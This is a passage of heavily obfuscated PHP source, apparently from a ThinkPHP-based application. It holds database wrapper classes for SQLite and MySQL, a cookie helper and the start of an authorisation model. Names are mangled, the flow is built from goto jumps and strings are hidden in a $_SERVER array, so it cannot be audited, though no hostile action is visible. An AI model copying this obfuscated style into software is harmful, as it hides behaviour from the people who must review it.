(is_bool($eÔİ†Ä²)) { $eÔİ†Ä² = $eÔİ†Ä² ? $C‡™ô°ñâ[83] : $C‡™ô°ñâ[464]; } elseif (is_null($eÔİ†Ä²)) { $eÔİ†Ä² = $C‡™ô°ñâ[101]; } return $eÔİ†Ä²; } public function getLastInsertId() { $BóÜÕ‘ƒ† =& $_SERVER[¼]; switch ($this->dbType) { case $BóÜÕ‘ƒ†[851]: case $BóÜÕ‘ƒ†[843]: case $BóÜÕ‘ƒ†[824]: case $BóÜÕ‘ƒ†[842]: case $BóÜÕ‘ƒ†[826]: case $BóÜÕ‘ƒ†[854]: return $this->_linkID->lastInsertId(); case $BóÜÕ‘ƒ†[825]: case $BóÜÕ‘ƒ†[827]: $aÂË›Ô…‰² = $this->table; $fë…á¿òö’ = $this->query("\123\105\x4c\x45\103\x54\40{$aÂË›Ô…‰²}\x2e\143\165\x72\x72\x76\x61\x6c\40\143\165\x72\162\166\x61\x6c\40\x46\x52\117\115\x20\x64\165\141\154"); return $fë…á¿òö’ ? $fë…á¿òö’[0][$BóÜÕ‘ƒ†[866]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($cËÕ¤öÔ‹Ü) { goto eÕ°Úï‘òÎ; D°†‡ùÒŠ¡: fclose($dÇ°«êÛªî); show_json($aîêŠƒµÂÌ[869], !1); return !1; goto f£¡„šÖË; eÕ°Úï‘òÎ: $aîêŠƒµÂÌ =& $_SERVER[¼]; $cñİöÂè«ò = DATA_PATH . $aîêŠƒµÂÌ[867]; $dÇ°«êÛªî = fopen($cñİöÂè«ò, $aîêŠƒµÂÌ[868]); goto Cò§ªèÑÃ; Cò§ªèÑÃ: if (!$dÇ°«êÛªî) { return !1; } if (flock($dÇ°«êÛªî, LOCK_EX)) { $bÚ™ë¿ËÁ— = parent::query($cËÕ¤öÔ‹Ü); flock($dÇ°«êÛªî, LOCK_UN); fclose($dÇ°«êÛªî); return $bÚ™ë¿ËÁ—; } flock($dÇ°«êÛªî, LOCK_UN); goto D°†‡ùÒŠ¡; f£¡„šÖË: } public function execute($dø½©’¸ê”) { goto a£¸Ñô™£Ş; D–©¶î·Æİ: fclose($D°Ø†Õ£‡); show_json($b‹‹Ì±“­ã[869], !1); return !1; goto A´ò¯Õç¤; a£¸Ñô™£Ş: $b‹‹Ì±“­ã =& $_SERVER[¼]; $FëšÏŞö‹ = DATA_PATH . $b‹‹Ì±“­ã[867]; $D°Ø†Õ£‡ = fopen($FëšÏŞö‹, $b‹‹Ì±“­ã[868]); goto AÍôãšäÚ; AÍôãšäÚ: if (!$D°Ø†Õ£‡) { return !1; } if (flock($D°Ø†Õ£‡, LOCK_EX)) { $f®Ò±ÇŒ» = parent::execute($dø½©’¸ê”); flock($D°Ø†Õ£‡, LOCK_UN); fclose($D°Ø†Õ£‡); return $f®Ò±ÇŒ»; } flock($D°Ø†Õ£‡, LOCK_UN); goto D–©¶î·Æİ; A´ò¯Õç¤: } } class DbSqlite3 extends DbSqlite3Base { public function query($F…ÀøÀë·) { goto BºÊÖµê—; aÈé…èé–: if (!$f²æ—¿„«ò) { return !1; } if (flock($f²æ—¿„«ò, LOCK_EX)) { $CØ¬È¹ˆ•Ş = parent::query($F…ÀøÀë·); flock($f²æ—¿„«ò, LOCK_UN); fclose($f²æ—¿„«ò); return $CØ¬È¹ˆ•Ş; } flock($f²æ—¿„«ò, LOCK_UN); goto C¤×Ã¸Ğ×À; BºÊÖµê—: $a¼õ¬¿æğ  =& $_SERVER[¼]; $FÑµô¨é = DATA_PATH . $a¼õ¬¿æğ [867]; $f²æ—¿„«ò = fopen($FÑµô¨é, $a¼õ¬¿æğ [868]); goto aÈé…èé–; C¤×Ã¸Ğ×À: fclose($f²æ—¿„«ò); show_json($a¼õ¬¿æğ [869], !1); return !1; goto BÓÃù Ü›; BÓÃù Ü›: } public function execute($BéÓÊŠŠ›˜) { goto CÖÅÓâÈÌ°; CÖÅÓâÈÌ°: $eÉã“»ˆ‚ =& $_SERVER[¼]; $D™Ë£ëœ–Ä = DATA_PATH . $eÉã“»ˆ‚[867]; $dîÙÉ­¿®è = fopen($D™Ë£ëœ–Ä, $eÉã“»ˆ‚[868]); goto aŠÆ÷ß›Óø; cİ¢Õ£—ù: fclose($dîÙÉ­¿®è); show_json($eÉã“»ˆ‚[869], !1); return !1; goto fù‰ç¾­©ß; aŠÆ÷ß›Óø: if (!$dîÙÉ­¿®è) { return !1; } if (flock($dîÙÉ­¿®è, LOCK_EX)) { $EáÏÅªâ‰© = parent::execute($BéÓÊŠŠ›˜); flock($dîÙÉ­¿®è, LOCK_UN); fclose($dîÙÉ­¿®è); return $EáÏÅªâ‰©; } flock($dîÙÉ­¿®è, LOCK_UN); goto cİ¢Õ£—ù; fù‰ç¾­©ß: } } goto d¾÷‡§£ßç; BÅîö¼‡¥Î: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($b™ˆÔ·ëØÊ = '', $D½ä©ôò¥¤ = 0) { if (is_string($b™ˆÔ·ëØÊ) && $b™ˆÔ·ëØÊ != $_SERVER[¼][33]) { $this->prefix = $b™ˆÔ·ëØÊ; } if (is_numeric($D½ä©ôò¥¤) && $D½ä©ôò¥¤ > 0) { $this->expire = $D½ä©ôò¥¤; } } public static function getInstance() { static $cºÓ¾·¦Ã; if ($cºÓ¾·¦Ã === null) { $cºÓ¾·¦Ã = new self(); } return $cºÓ¾·¦Ã; } private static $sameCookieSet = array(); public static function set($EğŸ¥š°©Ö, $DİèÛ¼¿…, $C”®²–”ñ¬ = 0, $b¥Ç¢œ¤© = false, $c»³£Å¦ÚÓ = false) { $a¦™õ”ö‚› =& $_SERVER[¼]; if (!$C”®²–”ñ¬) { $C”®²–”ñ¬ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$EğŸ¥š°©Ö]) && self::$sameCookieSet[$EğŸ¥š°©Ö] == $DİèÛ¼¿… . $C”®²–”ñ¬) { return; } self::$sameCookieSet[$EğŸ¥š°©Ö] = $DİèÛ¼¿… . $C”®²–”ñ¬; if (!$c»³£Å¦ÚÓ) { $c»³£Å¦ÚÓ = str_replace(HOST, $a¦™õ”ö‚›[33], APP_HOST); $c»³£Å¦ÚÓ = _get($GLOBALS, $a¦™õ”ö‚›[792], $c»³£Å¦ÚÓ); } setcookie($EğŸ¥š°©Ö, $DİèÛ¼¿…, time() + $C”®²–”ñ¬, $a¦™õ”ö‚›[8] . trim($c»³£Å¦ÚÓ, $a¦™õ”ö‚›[8]), !1, !1, $b¥Ç¢œ¤©); } public static function setSafe($AÎÒÍõùè–, $A¢‰ÊÀÛï†, $Dª…éß§íŠ = 0) { self::set($AÎÒÍõùè–, $A¢‰ÊÀÛï†, $Dª…éß§íŠ, !0); } public static function get($BŒ¡ÂÊµ´Á) { return isset($_COOKIE[$BŒ¡ÂÊµ´Á]) ? $_COOKIE[$BŒ¡ÂÊµ´Á] : !1; } public static function remove($dˆêé×Ş¯, $FË˜…¢¬‡… = false) { unset($_COOKIE[$dˆêé×Ş¯]); self::set($dˆêé×Ş¯, $_SERVER[¼][33], 1, $FË˜…¢¬‡…); } } class DbMysql extends Db { public function __construct($DÅÈ¥âÃ = '') { $dÄ”© —¤ç =& $_SERVER[¼]; if (!extension_loaded($dÄ”© —¤ç[720])) { think_exception(think_lang($dÄ”© —¤ç[10]) . $dÄ”© —¤ç[793]); } if (!empty($DÅÈ¥âÃ)) { $this->config = $DÅÈ¥âÃ; if (empty($this->config[$dÄ”© —¤ç[13]])) { $this->config[$dÄ”© —¤ç[13]] = $dÄ”© —¤ç[33]; } } } public function connect($b§éÉª‹´… = '', $dÚÆÓ¢ó¹ = 0, $eËÁ¸Ÿ“Å¾ = false) { $f™ÎÎêê¡£ =& $_SERVER[¼]; if (!isset($this->linkID[$dÚÆÓ¢ó¹])) { goto Eßğß¦â¥; FÒÎˆÑš¢È: mysql_query($f™ÎÎêê¡£[798] . think_config($f™ÎÎêê¡£[799]) . $f™ÎÎêê¡£[55], $this->linkID[$dÚÆÓ¢ó¹]); if ($b§ƒíÈîÈÄ > $f™ÎÎêê¡£[800]) { mysql_query($f™ÎÎêê¡£[801], $this->linkID[$dÚÆÓ¢ó¹]); } $this->connected = !0; goto FÒùĞÚ¡™«; FÒùĞÚ¡™«: if (1 != think_config($f™ÎÎêê¡£[18])) { unset($this->config); } goto a›öÉ×¦“; Eßğß¦â¥: if (empty($b§éÉª‹´…)) { $b§éÉª‹´… = $this->config; } $aˆÔ“ĞÆ¼ï = $b§éÉª‹´…[$f™ÎÎêê¡£[794]] . ($b§éÉª‹´…[$f™ÎÎêê¡£[795]] ? "\x3a{$b§éÉª‹´…[$f™ÎÎêê¡£[795]]}" : $f™ÎÎêê¡£[33]); $AÕÂõ†ÎÙ³ = !empty($b§éÉª‹´…[$f™ÎÎêê¡£[13]][$f™ÎÎêê¡£[14]]) ? $b§éÉª‹´…[$f™ÎÎêê¡£[13]][$f™ÎÎêê¡£[14]] : $this->pconnect; goto dùøå¥¸ïÏ; dùøå¥¸ïÏ: if ($AÕÂõ†ÎÙ³) { $this->linkID[$dÚÆÓ¢ó¹] = mysql_pconnect($aˆÔ“ĞÆ¼ï, $b§éÉª‹´…[$f™ÎÎêê¡£[796]], $b§éÉª‹´…[$f™ÎÎêê¡£[797]], 131072); } else { $this->linkID[$dÚÆÓ¢ó¹] = mysql_connect($aˆÔ“ĞÆ¼ï, $b§éÉª‹´…[$f™ÎÎêê¡£[796]], $b§éÉª‹´…[$f™ÎÎêê¡£[797]], !0, 131072); } if (!$this->linkID[$dÚÆÓ¢ó¹] || !empty($b§éÉª‹´…[$f™ÎÎêê¡£[17]]) && !mysql_select_db($b§éÉª‹´…[$f™ÎÎêê¡£[17]], $this->linkID[$dÚÆÓ¢ó¹])) { think_exception(mysql_error()); } $b§ƒíÈîÈÄ = mysql_get_server_info($this->linkID[$dÚÆÓ¢ó¹]); goto FÒÎˆÑš¢È; a›öÉ×¦“: } return $this->linkID[$dÚÆÓ¢ó¹]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Cñˆ¨Á‡‰Á) { goto FÛÌâ¦ÓÏ; A­Ïß£Í²: if (!$this->_linkID) { return !1; } $this->queryStr = $Cñˆ¨Á‡‰Á; if ($this->queryID) { $this->free(); } goto D¡µŒŒë’ñ; D¡µŒŒë’ñ: think_action_status($Fù·Ü¶ğ ‹[19], 1); think_status($Fù·Ü¶ğ ‹[20]); $this->queryID = mysql_query($Cñˆ¨Á‡‰Á, $this->_linkID); goto cå‘ˆ·‚áš; cå‘ˆ·‚áš: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto D½¨ŸÀØŸ; FÛÌâ¦ÓÏ: $Fù·Ü¶ğ ‹ =& $_SERVER[¼]; if (0 === stripos($Cñˆ¨Á‡‰Á, $Fù·Ü¶ğ ‹[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto A­Ïß£Í²; D½¨ŸÀØŸ: } public function execute($f›ª’öÎ¬) { goto DŒ®±ï†ìÀ; c³ÛòØÈğ: think_status($Cˆ›Ù¬õ©[20]); $A´Ô¦äÑãÁ = mysql_query($f›ª’öÎ¬, $this->_linkID); $this->debug(); goto BÉ¯¾ßÕñ; CÊˆŞ«Õ¼: $this->queryStr = $f›ª’öÎ¬; if ($this->queryID) { $this->free(); } think_action_status($Cˆ›Ù¬õ©[21], 1); goto c³ÛòØÈğ; DŒ®±ï†ìÀ: $Cˆ›Ù¬õ© =& $_SERVER[¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÊˆŞ«Õ¼; BÉ¯¾ßÕñ: if (!1 === $A´Ô¦äÑãÁ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto c„÷«éĞ‡; c„÷«éĞ‡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¼][802], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A×¦éëÚ¼¢ = mysql_query($_SERVER[¼][803], $this->_linkID); $this->transTimes = 0; if (!$A×¦éëÚ¼¢) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B¥†‘ˆ¨ùõ = mysql_query($_SERVER[¼][804], $this->_linkID); $this->transTimes = 0; if (!$B¥†‘ˆ¨ùõ) { $this->error(); return !1; } } return !0; } private function getAll() { $cùÑöŸÅ¿ = array(); if ($this->numRows > 0) { while ($F‰ˆªÖÊÁå = mysql_fetch_assoc($this->queryID)) { $cùÑöŸÅ¿[] = $F‰ˆªÖÊÁå; } mysql_data_seek($this->queryID, 0); } return $cùÑöŸÅ¿; } public function getFields($aÏø»ª“ª›) { $A¹¡½Òé¦à =& $_SERVER[¼]; $bö–éæãÊÀ = $this->query($A¹¡½Òé¦à[805] . $this->parseKey($aÏø»ª“ª›)); $C»»Ö»îÜ› = array(); if ($bö–éæãÊÀ) { foreach ($bö–éæãÊÀ as $B–™ÎÉò‰’ => $dã‰ïãˆƒª) { $C»»Ö»îÜ›[$dã‰ïãˆƒª[$A¹¡½Òé¦à[27]]] = array($A¹¡½Òé¦à[28] => $dã‰ïãˆƒª[$A¹¡½Òé¦à[27]], $A¹¡½Òé¦à[29] => $dã‰ïãˆƒª[$A¹¡½Òé¦à[30]], $A¹¡½Òé¦à[31] => (bool) (strtoupper($dã‰ïãˆƒª[$A¹¡½Òé¦à[32]]) === $A¹¡½Òé¦à[806]), $A¹¡½Òé¦à[34] => $dã‰ïãˆƒª[$A¹¡½Òé¦à[35]], $A¹¡½Òé¦à[36] => strtolower($dã‰ïãˆƒª[$A¹¡½Òé¦à[37]]) == $A¹¡½Òé¦à[38], $A¹¡½Òé¦à[39] => strtolower($dã‰ïãˆƒª[$A¹¡½Òé¦à[40]]) == $A¹¡½Òé¦à[41]); } } return $C»»Ö»îÜ›; } public function getTables($Aõ”Ïâ®ù² = '') { $eß¾Öì°—ò =& $_SERVER[¼]; if (!empty($Aõ”Ïâ®ù²)) { $Dœ‹Éè˜”Ş = $eß¾Öì°—ò[807] . $Aõ”Ïâ®ù²; } else { $Dœ‹Éè˜”Ş = $eß¾Öì°—ò[808]; } $d«Ì„†ª¶Ô = $this->query($Dœ‹Éè˜”Ş); $FâÓ‚¶”Â¤ = array(); foreach ($d«Ì„†ª¶Ô as $eÂ°Ë†öÊÎ => $eœŒäè¥™ì) { $FâÓ‚¶”Â¤[$eÂ°Ë†öÊÎ] = current($eœŒäè¥™ì); } return $FâÓ‚¶”Â¤; } public function replace($d¦¾»Ş¬Úö, $FœãÅí¢Öù = array()) { $CšÌ´¡ËùÔ =& $_SERVER[¼]; foreach ($d¦¾»Ş¬Úö as $A·£Ğ–ÂÂ‹ => $bé™™‡¢İ°) { $b…‹«Ìöí¥ = $this->parseValue($bé™™‡¢İ°); if (is_scalar($b…‹«Ìöí¥)) { $aåÚ¡¬½»˜[] = $b…‹«Ìöí¥; $e´×‡ŸÆ™ [] = $this->parseKey($A·£Ğ–ÂÂ‹); } } $eÈ»Ù–­·ë = $CšÌ´¡ËùÔ[809] . $this->parseTable($FœãÅí¢Öù[$CšÌ´¡ËùÔ[264]]) . $CšÌ´¡ËùÔ[810] . implode($CšÌ´¡ËùÔ[47], $e´×‡ŸÆ™ ) . $CšÌ´¡ËùÔ[811] . implode($CšÌ´¡ËùÔ[47], $aåÚ¡¬½»˜) . $CšÌ´¡ËùÔ[812]; return $this->execute($eÈ»Ù–­·ë); } public function insertAll($D„ÅŠ²È¦›, $A‘Ã…øì« = array(), $a‡ñã¸ğ‘È = false) { goto d¥Ü¿îÚğÙ; B¿ÕÇù•‚Á: $EÍÚŒù¨¿ = ($a‡ñã¸ğ‘È ? $eÌøÖáóº[814] : $eÌøÖáóº[815]) . $eÌøÖáóº[816] . $this->parseTable($A‘Ã…øì«[$eÌøÖáóº[264]]) . $eÌøÖáóº[810] . implode($eÌøÖáóº[47], $E±ÖÔäÕÍ) . $eÌøÖáóº[817] . implode($eÌøÖáóº[47], $b©¼â‹ƒÀ–); return $this->execute($EÍÚŒù¨¿); goto f‹ô¡êÑáğ; e¤‹õ¿»óå: $b©¼â‹ƒÀ– = array(); foreach ($D„ÅŠ²È¦› as $BŸßˆ¡Ê—™) { $bÂã¤½Ì¤™ = array(); foreach ($BŸßˆ¡Ê—™ as $E³…›Ÿ—‹• => $E…ËÉ±¾±ã) { $E…ËÉ±¾±ã = $this->parseValue($E…ËÉ±¾±ã); if (is_scalar($E…ËÉ±¾±ã)) { $bÂã¤½Ì¤™[] = $E…ËÉ±¾±ã; } } $b©¼â‹ƒÀ–[] = $eÌøÖáóº[245] . implode($eÌøÖáóº[47], $bÂã¤½Ì¤™) . $eÌøÖáóº[812]; } array_walk($E±ÖÔäÕÍ, array($this, $eÌøÖáóº[813])); goto B¿ÕÇù•‚Á; d¥Ü¿îÚğÙ: $eÌøÖáóº =& $_SERVER[¼]; if (!is_array($D„ÅŠ²È¦›[0])) { return !1; } $E±ÖÔäÕÍ = array_keys($D„ÅŠ²È¦›[0]); goto e¤‹õ¿»óå; f‹ô¡êÑáğ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eÚ¯ƒ–âÊ± =& $_SERVER[¼]; $this->error = mysql_errno() . $eÚ¯ƒ–âÊ±[4] . mysql_error($this->_linkID); if ($eÚ¯ƒ–âÊ±[33] != $this->queryStr) { $this->error .= LNG($eÚ¯ƒ–âÊ±[45]) . $this->queryStr; } think_trace($this->error, $eÚ¯ƒ–âÊ±[33], $eÚ¯ƒ–âÊ±[46]); return $this->error; } public function escapeString($a¨°§™àæ•) { if ($this->_linkID) { return mysql_real_escape_string($a¨°§™àæ•, $this->_linkID); } else { return mysql_escape_string($a¨°§™àæ•); } } public function parseKey(&$c  ‰›²î¡, $aÚ¶ç»…¾³ = true) { $bí×ôãùã =& $_SERVER[¼]; if ($aÚ¶ç»…¾³) { $c  ‰›²î¡ = $this->parseKeyCheck($c  ‰›²î¡); } if ($c  ‰›²î¡ != $bí×ôãùã[173] && !preg_match($bí×ôãùã[818], $c  ‰›²î¡)) { $c  ‰›²î¡ = $bí×ôãùã[819] . trim($c  ‰›²î¡, $bí×ôãùã[819]) . $bí×ôãùã[819]; } return $c  ‰›²î¡; } } class DbMysqli extends Db { public function __construct($c…áˆ‹–˜‡ = '') { $eßòºåµé© =& $_SERVER[¼]; if (!extension_loaded($eßòºåµé©[719])) { think_exception(think_lang($eßòºåµé©[10]) . $eßòºåµé©[820]); } if (!empty($c…áˆ‹–˜‡)) { $this->config = $c…áˆ‹–˜‡; if (empty($this->config[$eßòºåµé©[13]])) { $this->config[$eßòºåµé©[13]] = $eßòºåµé©[33]; } } } public function connect($DÙ´œ™®ôÄ = '', $F¹ˆ§™§–Å = 0) { $d¶‚ÎŠÛŒ =& $_SERVER[¼]; if (!isset($this->linkID[$F¹ˆ§™§–Å])) { goto bó‘¯¬ŠÊ¬; bó‘¯¬ŠÊ¬: if (empty($DÙ´œ™®ôÄ)) { $DÙ´œ™®ôÄ = $this->config; } $this->linkID[$F¹ˆ§™§–Å] = new mysqli($DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[794]], $DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[796]], $DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[797]], $DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[17]], $DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[795]] ? intval($DÙ´œ™®ôÄ[$d¶‚ÎŠÛŒ[795]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto eÎ¾«ë×‚; C²éßŸ®ğ®: $this->connected = !0; if (1 != think_config($d¶‚ÎŠÛŒ[18])) { unset($this->config); } goto C…ƒòÑéá; eÎ¾«ë×‚: $dàµ³è‚À¡ = $this->linkID[$F¹ˆ§™§–Å]->server_version; $this->linkID[$F¹ˆ§™§–Å]->query($d¶‚ÎŠÛŒ[798] . think_config($d¶‚ÎŠÛŒ[799]) . $d¶‚ÎŠÛŒ[55]); if ($dàµ³è‚À¡ > $d¶‚ÎŠÛŒ[800]) { $this->linkID[$F¹ˆ§™§–Å]->query($d¶‚ÎŠÛŒ[801]); } goto C²éßŸ®ğ®; C…ƒòÑéá: } return $this->linkID[$F¹ˆ§™§–Å]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($BóŠùòâÙ) { goto B¤·öù’Å»; f›Ô¥‘‚À: $this->queryStr = $BóŠùòâÙ; if ($this->queryID) { $this->free(); } think_action_status($E„ô±”±¡[19], 1); goto AóË•ˆÏïç; B¤·öù’Å»: $E„ô±”±¡ =& $_SERVER[¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f›Ô¥‘‚À; AóË•ˆÏïç: think_status($E„ô±”±¡[20]); $this->queryID = $this->_linkID->query($BóŠùòâÙ); if ($this->_linkID->more_results()) { while (($FÌ„Ü­›ˆÊ = $this->_linkID->next_result()) != NULL) { $FÌ„Ü­›ˆÊ->free_result(); } } goto fî”ÈŒí©÷; fî”ÈŒí©÷: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto dñ”¶’‘÷Ä; dñ”¶’‘÷Ä: } public function execute($dÂ‚ÒÇÍß) { goto C…¹ó‰ÒòÙ; f‘Õ”†„Ø»: think_status($EÛÙèïÀ[20]); $Aïõ¡¿Ù‹ª = $this->_linkID->query($dÂ‚ÒÇÍß); $this->debug(); goto DÜ­¼Š¸éä; DÜ­¼Š¸éä: if (!1 === $Aïõ¡¿Ù‹ª) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto A¿ãÛéòèÓ; F´Ÿ½Ÿôñô: $this->queryStr = $dÂ‚ÒÇÍß; if ($this->queryID) { $this->free(); } think_action_status($EÛÙèïÀ[21], 1); goto f‘Õ”†„Ø»; C…¹ó‰ÒòÙ: $EÛÙèïÀ =& $_SERVER[¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F´Ÿ½Ÿôñô; A¿ãÛéòèÓ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aíÀÎù”£ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aíÀÎù”£) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C£—Œ˜ÎôÔ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C£—Œ˜ÎôÔ) { $this->error(); return !1; } } return !0; } private function getAll() { $E´ÑÈŠ½İç = array(); if ($this->numRows > 0) { for ($a¶‹õÜ…Ê = 0; $a¶‹õÜ…Ê < $this->numRows; $a¶‹õÜ…Ê++) { $E´ÑÈŠ½İç[$a¶‹õÜ…Ê] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $E´ÑÈŠ½İç; } public function getFields($CÖîóåß³˜) { $DŒÅÑ¡ÈŠ  =& $_SERVER[¼]; $c˜¬±‰÷ÂÛ = $this->query($DŒÅÑ¡ÈŠ [805] . $this->parseKey($CÖîóåß³˜)); $d®çëÛš…î = array(); if ($c˜¬±‰÷ÂÛ) { foreach ($c˜¬±‰÷ÂÛ as $EŒ´‡ë©Şê => $AÈ‚½˜ÂµØ) { $d®çëÛš…î[$AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [27]]] = array($DŒÅÑ¡ÈŠ [28] => $AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [27]], $DŒÅÑ¡ÈŠ [29] => $AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [30]], $DŒÅÑ¡ÈŠ [31] => (bool) ($AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [32]] === $DŒÅÑ¡ÈŠ [33]), $DŒÅÑ¡ÈŠ [34] => $AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [35]], $DŒÅÑ¡ÈŠ [36] => strtolower($AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [37]]) == $DŒÅÑ¡ÈŠ [38], $DŒÅÑ¡ÈŠ [39] => strtolower($AÈ‚½˜ÂµØ[$DŒÅÑ¡ÈŠ [40]]) == $DŒÅÑ¡ÈŠ [41]); } } return $d®çëÛš…î; } public function getTables($e¶Ä©ì·ø¡ = '') { $A ã‘éïí‰ =& $_SERVER[¼]; $dÎ«êÈÌÛè = !empty($e¶Ä©ì·ø¡) ? $A ã‘éïí‰[807] . $e¶Ä©ì·ø¡ : $A ã‘éïí‰[808]; $cßŒÃë¥Î = $this->query($dÎ«êÈÌÛè); $a”ì·Ì¬ÈŞ = array(); if ($cßŒÃë¥Î) { foreach ($cßŒÃë¥Î as $Aãï¯“º => $B†‚ÚÎ•‡—) { $a”ì·Ì¬ÈŞ[$Aãï¯“º] = current($B†‚ÚÎ•‡—); } } return $a”ì·Ì¬ÈŞ; } public function replace($fº¦«ë“¶Ô, $c’…ïÊîÊ = array()) { $e£ñÙ§£Ú =& $_SERVER[¼]; foreach ($fº¦«ë“¶Ô as $f›§õÉÊÎ‘ => $cŒÁ©ĞµÊ) { $DÃ·öøØÆ = $this->parseValue($cŒÁ©ĞµÊ); if (is_scalar($DÃ·öøØÆ)) { $dĞøÜó‡‡¥[] = $DÃ·öøØÆ; $a ª¯¢ßÊÒ[] = $this->parseKey($f›§õÉÊÎ‘); } } $e¯¼§ÎåÖó = $e£ñÙ§£Ú[809] . $this->parseTable($c’…ïÊîÊ[$e£ñÙ§£Ú[264]]) . $e£ñÙ§£Ú[810] . implode($e£ñÙ§£Ú[47], $a ª¯¢ßÊÒ) . $e£ñÙ§£Ú[811] . implode($e£ñÙ§£Ú[47], $dĞøÜó‡‡¥) . $e£ñÙ§£Ú[812]; return $this->execute($e¯¼§ÎåÖó); } public function insertAll($EĞ°³Áàƒö, $Aò¨ˆ¹ë–Œ = array(), $fˆøšß¨âé = false) { goto e˜ß…“‚ÒÙ; F¢òÛ¦ä¼ñ: $F¦”ØÉ¯Ôµ = array(); foreach ($EĞ°³Áàƒö as $fœ‰Ì®ÑÆá) { $cíìÕÁ×»¿ = array(); foreach ($fœ‰Ì®ÑÆá as $Cñ¿ÊÀÄŒ¨ => $Aä—¼Â‚ÎÃ) { $Aä—¼Â‚ÎÃ = $this->parseValue($Aä—¼Â‚ÎÃ); if (is_scalar($Aä—¼Â‚ÎÃ)) { $cíìÕÁ×»¿[] = $Aä—¼Â‚ÎÃ; } } $F¦”ØÉ¯Ôµ[] = $Få¬…Ò¸÷„[245] . implode($Få¬…Ò¸÷„[47], $cíìÕÁ×»¿) . $Få¬…Ò¸÷„[812]; } array_walk($b¬î‡†×š², array($this, $Få¬…Ò¸÷„[813])); goto D…’©Ñ‹»’; e˜ß…“‚ÒÙ: $Få¬…Ò¸÷„ =& $_SERVER[¼]; if (!is_array($EĞ°³Áàƒö[0])) { return !1; } $b¬î‡†×š² = array_keys($EĞ°³Áàƒö[0]); goto F¢òÛ¦ä¼ñ; D…’©Ñ‹»’: $bÊÊ³©Š×Ø = ($fˆøšß¨âé ? $Få¬…Ò¸÷„[814] : $Få¬…Ò¸÷„[815]) . $Få¬…Ò¸÷„[816] . $this->parseTable($Aò¨ˆ¹ë–Œ[$Få¬…Ò¸÷„[264]]) . $Få¬…Ò¸÷„[810] . implode($Få¬…Ò¸÷„[47], $b¬î‡†×š²) . $Få¬…Ò¸÷„[817] . implode($Få¬…Ò¸÷„[47], $F¦”ØÉ¯Ôµ); return $this->execute($bÊÊ³©Š×Ø); goto b“‚¹‰˜‹ñ; b“‚¹‰˜‹ñ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c¹Ìˆî‰ =& $_SERVER[¼]; $this->error = $this->_linkID->errno . $c¹Ìˆî‰[4] . $this->_linkID->error; if ($c¹Ìˆî‰[33] != $this->queryStr) { $this->error .= LNG($c¹Ìˆî‰[45]) . $this->queryStr; } think_trace($this->error, $c¹Ìˆî‰[33], $c¹Ìˆî‰[46]); return $this->error; } public function escapeString($eá‚Àñ„Œ‰) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eá‚Àñ„Œ‰); } else { return addslashes($eá‚Àñ„Œ‰); } } public function parseKey(&$aŸ‰æâ‰Ó, $dºÃ‰àÊõ¯ = true) { $dùØŒ‚é¨ñ =& $_SERVER[¼]; if ($dºÃ‰àÊõ¯) { $aŸ‰æâ‰Ó = $this->parseKeyCheck($aŸ‰æâ‰Ó); } if ($aŸ‰æâ‰Ó != $dùØŒ‚é¨ñ[173] && !preg_match($dùØŒ‚é¨ñ[818], $aŸ‰æâ‰Ó)) { $aŸ‰æâ‰Ó = $dùØŒ‚é¨ñ[819] . trim($aŸ‰æâ‰Ó, $dùØŒ‚é¨ñ[819]) . $dùØŒ‚é¨ñ[819]; } return $aŸ‰æâ‰Ó; } } goto b¥­§—¹¦; F¼ÌÃäÁ‚¯: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $B˜„×ğÍ¡ =& 